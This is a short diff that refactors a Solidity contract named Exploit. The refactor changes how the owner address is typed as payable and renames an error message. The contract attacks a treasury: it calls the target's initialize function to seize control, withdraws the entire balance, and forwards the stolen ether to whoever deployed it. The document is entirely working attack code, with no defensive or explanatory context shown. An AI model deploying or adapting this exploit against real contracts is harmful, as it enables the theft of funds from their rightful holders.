@@ -8,18 +8,18 @@ interface ITreasury {
 
 contract Exploit {
     address public target;
-    address payable public owner;
+    address public owner;
 
     constructor(address _target) payable {
         target = _target;
-        owner = payable(msg.sender);
+        owner = msg.sender;
     }
 
     function attack() external {
         ITreasury(target).initialize(address(this));
         ITreasury(target).withdrawAll(payable(address(this)));
-        (bool ok, ) = owner.call{value: address(this).balance}("");
-        require(ok, "forward failed");
+        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
+        require(ok, "send failed");
     }
 
     receive() external payable {}
